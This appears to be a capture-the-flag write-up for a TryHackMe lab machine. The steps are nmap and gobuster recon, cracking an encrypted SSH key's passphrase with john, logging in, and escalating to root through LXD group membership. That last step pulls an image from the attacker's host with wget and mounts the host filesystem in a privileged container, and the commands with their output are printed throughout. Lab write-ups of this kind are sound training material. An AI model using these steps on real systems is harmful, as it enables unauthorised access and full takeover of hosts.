# recon
- nmap
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
```
- gobuster
```
/about.php (Status: 200)
/about.html (Status: 200)
/index.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

- port 80 httpserver
  - index.html: `<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->`
  - where is `/arhives.html`
  - /uploads/dict.lst: a password list
  - /secret: contain RSA key encrypted with AES


# foot hold
so as you can see, we got a password list + ssh key (RSA) encrypted with AES. I guess one of the password in the list (`/uploads/dict.lst`) can be use to decrypt the ssh key. We can then use ssh key to gain foot hold one victim server.

let start with convert encrypted ssh key to a format that john can understand. then use john to crack the password. we will use as our password list.
```console
kali@kali:~/THM/gamingserver$ sudo python /usr/share/john/ssh2john.py secretKey s > ssh2john.txt
kali@kali:~/THM/gamingserver$ sudo john --wordlist=dict.lst ssh2john.txt
.
.
Press 'q' or Ctrl-C to abort, almost any other key for status
<something>          (secretKey)
1g 0:00:00:00 DONE (2020-09-02 14:47) 100.0g/s 22200p/s 22200c/s 22200C/s 2003..starwars
```
now lets use to `openssl` to decrypt `secretKey`
```console
kali@kali:~/THM/gamingserver$ openssl rsa -in secretKey -out gamingserver_key
Enter pass phrase for secretKey:
writing RSA key
```
what are we waiting for let ssh to the victim server. Grab the user flag
```console
kali@kali:~/THM/gamingserver$ ssh john@$IP -i gamingserver_key
Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ ls
user.txt
```
# root
```console
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
lxd !! I have seen it so many time. if you dont know what LXD is pls do some research by yourself, Also check this for step by step lxd exploit [link](https://www.hackingarticles.in/lxd-privilege-escalation/)


so what are we waiting for. let get root!!

```console
john@exploitable:~$ wget http://<kali IP>:8080/myalpine.tar.gz
2020-09-02 19:04:23 (1.01 MB/s) - ‘myalpine.tar.gz’ saved [3199169/3199169]
john@exploitable:~$ ls
myalpine.tar.gz  user.txt
john@exploitable:~$ lxc image import myalpine.tar.gz --alias kurohat
Image imported with fingerprint: 19d278b8c78857a750fb2589c3addb3fa4a4b11fbb2c2b28275400e3a60fbb79
john@exploitable:~$ lxc init kurohat ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite 
john@exploitable:/mnt$ lxc exec ignite /bin/sh # bash will also work but this server do not have /bin/bash
~ # id
uid=0(root) gid=0(root)
```
now let move to the mount poin `/mnt/root/` and grab the root flag